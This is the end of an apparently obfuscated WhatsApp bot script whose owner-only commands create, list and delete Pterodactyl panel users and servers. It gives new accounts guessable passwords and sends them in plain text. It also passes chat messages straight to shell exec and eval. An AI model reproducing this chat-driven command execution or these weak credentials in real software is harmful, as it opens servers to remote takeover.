          let _0xe7edd7 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x4e0db4.id + "\nUsername: " + _0x4e0db4.username + "\nEmail: " + _0x4e0db4.email + "\nName: " + _0x4e0db4.first_name + " " + _0x4e0db4.last_name + "\nMemory: " + (_0x268e05.limits.memory === 0 ? "Unlimited" : _0x268e05.limits.memory) + " MB\nDisk: " + (_0x268e05.limits.disk === 0 ? "Unlimited" : _0x268e05.limits.disk + "MB") + "\nCpu: " + (_0x268e05.limits.cpu === 0 ? "Unlimited" : _0x268e05.limits.cpu + "%"));
        }
        break;
      case "6gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x2f72a0 = text2.split(",");
          if (_0x2f72a0.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x246e96 = _0x2f72a0[0];
          let _0x4cf4a8 = m.quoted ? m.quoted.sender : _0x2f72a0[1] ? _0x2f72a0[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x40e906 = _0x246e96;
          let _0x7ab2ed = global.eggsnya;
          let _0x2042f8 = global.location;
          let _0xcf9670 = "6024";
          let _0x5bf99d = "160";
          let _0x10e9b9 = "6024";
          let _0x4c7239 = _0x246e96 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x4cf4a8) {
            return;
          }
          let _0x5095a7 = (await sock.onWhatsApp(_0x4cf4a8.split`@`[0]))[0] || {};
          let _0x4b7a98 = _0x246e96 + "001";
          const _0x344ad9 = {
            email: _0x4c7239,
            username: _0x246e96,
            first_name: _0x246e96,
            last_name: _0x246e96,
            language: "en",
            password: _0x4b7a98
          };
          let _0x179daa = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x344ad9)
          });
          let _0x50e1d9 = await _0x179daa.json();
          if (_0x50e1d9.errors) {
            return _0x1595c1(JSON.stringify(_0x50e1d9.errors[0], null, 2));
          }
          let _0x5ab707 = _0x50e1d9.attributes;
          let _0x9e17d7 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x7ab2ed, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x5ab707.id);
          let _0x3e09be = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x5ab707.username + "\n🔐 Password: " + _0x4b7a98 + "\n🔗 Url: " + domain;
          const _0x5a514c = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x3e09be
          };
          const _0x5d5b4d = {
            quoted: m
          };
          sock.sendMessage(_0x4cf4a8, _0x5a514c, _0x5d5b4d);
          let _0x3bd87e = await _0x9e17d7.json();
          let _0x26134e = _0x3bd87e.attributes.startup;
          const _0x3da129 = {
            memory: _0xcf9670,
            swap: 0,
            disk: _0x10e9b9,
            io: 500,
            cpu: _0x5bf99d
          };
          let _0x48af97 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x40e906 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x5ab707.id,
              egg: parseInt(_0x7ab2ed),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x26134e,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x3da129,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x2042f8)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x37fab5 = await _0x48af97.json();
          if (_0x37fab5.errors) {
            return sock(JSON.stringify(_0x37fab5.errors[0], null, 2));
          }
          let _0x16784a = _0x37fab5.attributes;
          let _0xc2e224 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5ab707.id + "\nUsername: " + _0x5ab707.username + "\nEmail: " + _0x5ab707.email + "\nName: " + _0x5ab707.first_name + " " + _0x5ab707.last_name + "\nMemory: " + (_0x16784a.limits.memory === 0 ? "Unlimited" : _0x16784a.limits.memory) + " MB\nDisk: " + (_0x16784a.limits.disk === 0 ? "Unlimited" : _0x16784a.limits.disk + "MB") + "\nCpu: " + (_0x16784a.limits.cpu === 0 ? "Unlimited" : _0x16784a.limits.cpu + "%"));
        }
        break;
      case "7gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x4e3936 = text2.split(",");
          if (_0x4e3936.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x4eabf6 = _0x4e3936[0];
          let _0x43faca = m.quoted ? m.quoted.sender : _0x4e3936[1] ? _0x4e3936[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x47366b = _0x4eabf6;
          let _0x56e1d8 = global.eggsnya;
          let _0x42315c = global.location;
          let _0x420ed2 = "7024";
          let _0x53dee3 = "170";
          let _0x1e5f5b = "7024";
          let _0x1e95ad = _0x4eabf6 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x43faca) {
            return;
          }
          let _0x1597da = (await sock.onWhatsApp(_0x43faca.split`@`[0]))[0] || {};
          let _0x51eedd = _0x4eabf6 + "001";
          const _0x490dfb = {
            email: _0x1e95ad,
            username: _0x4eabf6,
            first_name: _0x4eabf6,
            last_name: _0x4eabf6,
            language: "en",
            password: _0x51eedd
          };
          let _0xce8c04 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x490dfb)
          });
          let _0x37a212 = await _0xce8c04.json();
          if (_0x37a212.errors) {
            return _0x1595c1(JSON.stringify(_0x37a212.errors[0], null, 2));
          }
          let _0x1bd781 = _0x37a212.attributes;
          let _0x58b68c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x56e1d8, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x1bd781.id);
          let _0x333bfc = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1bd781.username + "\n🔐 Password: " + _0x51eedd + "\n🔗 Url: " + domain;
          const _0x4f30d4 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x333bfc
          };
          const _0x1a1db4 = {
            quoted: m
          };
          sock.sendMessage(_0x43faca, _0x4f30d4, _0x1a1db4);
          let _0x9976fc = await _0x58b68c.json();
          let _0x3352f4 = _0x9976fc.attributes.startup;
          const _0x2d78fe = {
            memory: _0x420ed2,
            swap: 0,
            disk: _0x1e5f5b,
            io: 500,
            cpu: _0x53dee3
          };
          let _0x336d58 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x47366b + " - 1gb",
              description: "Create with " + namabot,
              user: _0x1bd781.id,
              egg: parseInt(_0x56e1d8),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x3352f4,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x2d78fe,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x42315c)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x180276 = await _0x336d58.json();
          if (_0x180276.errors) {
            return sock(JSON.stringify(_0x180276.errors[0], null, 2));
          }
          let _0x2ae20a = _0x180276.attributes;
          let _0x1d6f2f = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x1bd781.id + "\nUsername: " + _0x1bd781.username + "\nEmail: " + _0x1bd781.email + "\nName: " + _0x1bd781.first_name + " " + _0x1bd781.last_name + "\nMemory: " + (_0x2ae20a.limits.memory === 0 ? "Unlimited" : _0x2ae20a.limits.memory) + " MB\nDisk: " + (_0x2ae20a.limits.disk === 0 ? "Unlimited" : _0x2ae20a.limits.disk + "MB") + "\nCpu: " + (_0x2ae20a.limits.cpu === 0 ? "Unlimited" : _0x2ae20a.limits.cpu + "%"));
        }
        break;
      case "8gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x41985f = text2.split(",");
          if (_0x41985f.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x1bf2dd = _0x41985f[0];
          let _0x15eb9d = m.quoted ? m.quoted.sender : _0x41985f[1] ? _0x41985f[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x2621d7 = _0x1bf2dd;
          let _0x10ff6e = global.eggsnya;
          let _0x1173de = global.location;
          let _0x3a9c48 = "8024";
          let _0x3f48ba = "180";
          let _0x1b889c = "8024";
          let _0x19f6ed = _0x1bf2dd + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x15eb9d) {
            return;
          }
          let _0x5ed6b4 = (await sock.onWhatsApp(_0x15eb9d.split`@`[0]))[0] || {};
          let _0x47e5a5 = _0x1bf2dd + "001";
          const _0x5b3e98 = {
            email: _0x19f6ed,
            username: _0x1bf2dd,
            first_name: _0x1bf2dd,
            last_name: _0x1bf2dd,
            language: "en",
            password: _0x47e5a5
          };
          let _0x438419 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x5b3e98)
          });
          let _0x427ca6 = await _0x438419.json();
          if (_0x427ca6.errors) {
            return _0x1595c1(JSON.stringify(_0x427ca6.errors[0], null, 2));
          }
          let _0x8e699 = _0x427ca6.attributes;
          let _0xaa03e3 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x10ff6e, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x8e699.id);
          let _0x474b69 = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x8e699.username + "\n🔐 Password: " + _0x47e5a5 + "\n🔗 Url: " + domain;
          const _0x30f710 = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x474b69
          };
          const _0x9a2fb5 = {
            quoted: m
          };
          sock.sendMessage(_0x15eb9d, _0x30f710, _0x9a2fb5);
          let _0x501dae = await _0xaa03e3.json();
          let _0x4dd59b = _0x501dae.attributes.startup;
          const _0x1b0feb = {
            memory: _0x3a9c48,
            swap: 0,
            disk: _0x1b889c,
            io: 500,
            cpu: _0x3f48ba
          };
          let _0x2274f8 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2621d7 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x8e699.id,
              egg: parseInt(_0x10ff6e),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x4dd59b,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x1b0feb,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x1173de)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x3ef728 = await _0x2274f8.json();
          if (_0x3ef728.errors) {
            return sock(JSON.stringify(_0x3ef728.errors[0], null, 2));
          }
          let _0x3d9c97 = _0x3ef728.attributes;
          let _0xc87d1d = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x8e699.id + "\nUsername: " + _0x8e699.username + "\nEmail: " + _0x8e699.email + "\nName: " + _0x8e699.first_name + " " + _0x8e699.last_name + "\nMemory: " + (_0x3d9c97.limits.memory === 0 ? "Unlimited" : _0x3d9c97.limits.memory) + " MB\nDisk: " + (_0x3d9c97.limits.disk === 0 ? "Unlimited" : _0x3d9c97.limits.disk + "MB") + "\nCpu: " + (_0x3d9c97.limits.cpu === 0 ? "Unlimited" : _0x3d9c97.limits.cpu + "%"));
        }
        break;
      case "9gb":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x4a698f = text2.split(",");
          if (_0x4a698f.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x169cd8 = _0x4a698f[0];
          let _0xde8104 = m.quoted ? m.quoted.sender : _0x4a698f[1] ? _0x4a698f[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x3ae9b8 = _0x169cd8;
          let _0x2d2529 = global.eggsnya;
          let _0x33386a = global.location;
          let _0x5b7a66 = "9024";
          let _0x5ec05b = "190";
          let _0x2f6fa7 = "9024";
          let _0x1b0952 = _0x169cd8 + "zxv@sweetrabit.ml";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0xde8104) {
            return;
          }
          let _0x24d835 = (await sock.onWhatsApp(_0xde8104.split`@`[0]))[0] || {};
          let _0x580a91 = _0x169cd8 + "001";
          const _0x5b209b = {
            email: _0x1b0952,
            username: _0x169cd8,
            first_name: _0x169cd8,
            last_name: _0x169cd8,
            language: "en",
            password: _0x580a91
          };
          let _0x2b0b99 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x5b209b)
          });
          let _0x43ea91 = await _0x2b0b99.json();
          if (_0x43ea91.errors) {
            return _0x1595c1(JSON.stringify(_0x43ea91.errors[0], null, 2));
          }
          let _0x5ac503 = _0x43ea91.attributes;
          let _0x12590f = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2d2529, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x5ac503.id);
          let _0x3fad2f = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x5ac503.username + "\n🔐 Password: " + _0x580a91 + "\n🔗 Url: " + domain;
          const _0x4321ed = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x3fad2f
          };
          const _0x3b0892 = {
            quoted: m
          };
          sock.sendMessage(_0xde8104, _0x4321ed, _0x3b0892);
          let _0x214735 = await _0x12590f.json();
          let _0x3ff113 = _0x214735.attributes.startup;
          const _0x215b4f = {
            memory: _0x5b7a66,
            swap: 0,
            disk: _0x2f6fa7,
            io: 500,
            cpu: _0x5ec05b
          };
          let _0x971d75 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x3ae9b8 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x5ac503.id,
              egg: parseInt(_0x2d2529),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x3ff113,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x215b4f,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x33386a)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x1fd9d3 = await _0x971d75.json();
          if (_0x1fd9d3.errors) {
            return sock(JSON.stringify(_0x1fd9d3.errors[0], null, 2));
          }
          let _0x4bb64e = _0x1fd9d3.attributes;
          let _0x86a595 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5ac503.id + "\nUsername: " + _0x5ac503.username + "\nEmail: " + _0x5ac503.email + "\nName: " + _0x5ac503.first_name + " " + _0x5ac503.last_name + "\nMemory: " + (_0x4bb64e.limits.memory === 0 ? "Unlimited" : _0x4bb64e.limits.memory) + " MB\nDisk: " + (_0x4bb64e.limits.disk === 0 ? "Unlimited" : _0x4bb64e.limits.disk + "MB") + "\nCpu: " + (_0x4bb64e.limits.cpu === 0 ? "Unlimited" : _0x4bb64e.limits.cpu + "%"));
        }
        break;
      case "unli":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x3cdf80 = text2.split(",");
          if (_0x3cdf80.length < 2) {
            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
          }
          let _0x2cda55 = _0x3cdf80[0];
          let _0x4c611c = m.quoted ? m.quoted.sender : _0x3cdf80[1] ? _0x3cdf80[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
          let _0x43cee9 = _0x2cda55;
          let _0x2c2ab4 = global.eggsnya;
          let _0xae2b29 = global.location;
          let _0x12c450 = "0";
          let _0x52fac5 = "0";
          let _0x22ca4b = "0";
          let _0x2773f4 = _0x2cda55 + "Zyn@Tzy.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x4c611c) {
            return;
          }
          let _0x1794de = (await sock.onWhatsApp(_0x4c611c.split`@`[0]))[0] || {};
          let _0x1a66a7 = _0x2cda55 + "001";
          const _0x76d7e9 = {
            email: _0x2773f4,
            username: _0x2cda55,
            first_name: _0x2cda55,
            last_name: _0x2cda55,
            language: "en",
            password: _0x1a66a7
          };
          let _0x4fa8a0 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x76d7e9)
          });
          let _0x4a1d45 = await _0x4fa8a0.json();
          if (_0x4a1d45.errors) {
            return _0x1595c1(JSON.stringify(_0x4a1d45.errors[0], null, 2));
          }
          let _0x346d06 = _0x4a1d45.attributes;
          let _0x4baae0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2c2ab4, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x1595c1("User ID: " + _0x346d06.id);
          let _0x29c479 = "Hai @" + m.sender.split("@")[0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x346d06.username + "\n🔐 Password: " + _0x1a66a7 + "\n🔗 Url: " + domain;
          const _0x36ce7c = {
            image: {
              url: "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            caption: _0x29c479
          };
          const _0x1316e4 = {
            quoted: m
          };
          sock.sendMessage(_0x4c611c, _0x36ce7c, _0x1316e4);
          let _0x225420 = await _0x4baae0.json();
          let _0x4cebdb = _0x225420.attributes.startup;
          const _0x2495a5 = {
            memory: _0x12c450,
            swap: 0,
            disk: _0x22ca4b,
            io: 500,
            cpu: _0x52fac5
          };
          let _0x4e07df = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x43cee9 + " - 1gb",
              description: "Create with " + namabot,
              user: _0x346d06.id,
              egg: parseInt(_0x2c2ab4),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x4cebdb,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x2495a5,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0xae2b29)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x421d42 = await _0x4e07df.json();
          if (_0x421d42.errors) {
            return sock(JSON.stringify(_0x421d42.errors[0], null, 2));
          }
          let _0x1b98c4 = _0x421d42.attributes;
          let _0x3b1774 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x346d06.id + "\nUsername: " + _0x346d06.username + "\nEmail: " + _0x346d06.email + "\nName: " + _0x346d06.first_name + " " + _0x346d06.last_name + "\nMemory: " + (_0x1b98c4.limits.memory === 0 ? "Unlimited" : _0x1b98c4.limits.memory) + " MB\nDisk: " + (_0x1b98c4.limits.disk === 0 ? "Unlimited" : _0x1b98c4.limits.disk + "MB") + "\nCpu: " + (_0x1b98c4.limits.cpu === 0 ? "Unlimited" : _0x1b98c4.limits.cpu + "%"));
        }
        break;
      case "listsrv":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x155a2f = args[0] ? args[0] : "1";
          let _0x3b2b7d = await fetch(domain + "/api/application/servers?page=" + _0x155a2f, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x5ee3fb = await _0x3b2b7d.json();
          let _0x380825 = _0x5ee3fb.data;
          let _0x35fc4a = [];
          let _0x2e3e56 = "Here is the list of servers:\n\n";
          for (let _0x57a4e1 of _0x380825) {
            let _0x6a3ea8 = _0x57a4e1.attributes;
            let _0x47d9c0 = await fetch(domain + "/api/client/servers/" + _0x6a3ea8.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let _0x4d1568 = await _0x47d9c0.json();
            let _0x31a08b = _0x4d1568.attributes ? _0x4d1568.attributes.current_state : _0x6a3ea8.status;
            _0x2e3e56 += "ID Server: " + _0x6a3ea8.id + "\n";
            _0x2e3e56 += "Nama Server: " + _0x6a3ea8.name + "\n";
            _0x2e3e56 += "Status: " + _0x31a08b + "\n\n";
          }
          _0x2e3e56 += "Halaman: " + _0x5ee3fb.meta.pagination.current_page + "/" + _0x5ee3fb.meta.pagination.total_pages + "\n";
          _0x2e3e56 += "Total Server: " + _0x5ee3fb.meta.pagination.count;
          const _0x61ee50 = {
            text: _0x2e3e56
          };
          await sock.sendMessage(m.chat, _0x61ee50, {
            quoted: m
          });
          if (_0x5ee3fb.meta.pagination.current_page < _0x5ee3fb.meta.pagination.total_pages) {
            _0x1595c1("Use the command " + (prefixMatch ? prefixMatch : ".") + "listsrv " + (_0x5ee3fb.meta.pagination.current_page + 1) + " to see the next page.");
          }
        }
        break;
      case "delsrv":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x1f2a34 = args[0];
          if (!_0x1f2a34) {
            return _0x1595c1("Where's the ID?");
          }
          let _0x559461 = await fetch(domain + "/api/application/servers/" + _0x1f2a34, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x440586 = _0x559461.ok ? {
            errors: null
          } : await _0x559461.json();
          if (_0x440586.errors) {
            return _0x1595c1("Server not found");
          }
          _0x1595c1("Successfully deleted the Server.");
        }
        break;
      case "totalfitur":
        {
          ngaceng = fs.readFileSync("./STINGER-V4.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x2e62c8 => _0x2e62c8.match(/case '([^']+)'/)[1]);
          let _0x5ac04d = await sock.fetchBlocklist();
          let _0x5dee2e = Object.values(await sock.groupFetchAllParticipating().catch(_0x121490 => null));
          let _0x3e1400 = caseCount;
          let _0x414705 = caseNames.join("\n${prefix} ");
          _0x1595c1(" *Haii " + pushname + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + countFeatures() + " Fitur*");
        }
        break;
      default:
    }
    if (text.startsWith("$") && isOwner) {
      exec(text.slice(2), (_0x1fd91e, _0x56c1a0) => {
        if (_0x1fd91e) {
          return _0x1595c1(_0x1fd91e);
        }
        if (_0x56c1a0) {
          return _0x1595c1(_0x56c1a0);
        }
      });
    }
    if (text.startsWith(">")) {
      if (!isOwner) {
        return _0x1595c1(mess.only.owner);
      }
      try {
        let _0x31143c = await eval(text.slice(2));
        if (typeof _0x31143c !== "string") {
          _0x31143c = require("util").inspect(_0x31143c);
        }
        await _0x1595c1(_0x31143c);
      } catch (_0xb6159f) {
        _0x1595c1(String(_0xb6159f));
      }
    }
  } catch (_0x1f12e6) {
    console.log(_0x1f12e6);
    sock.sendMessage(owner + "@s.whatsapp.net", {
      text: "" + util.format(_0x1f12e6)
    });
    try {
      await sock.sendMessage(m.chat, {
        react: {
          text: "❌",
          key: m.key
        }
      });
      await m.reply("❌ Something went wrong processing that command.");
    } catch (_0x1f12e7) {}
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});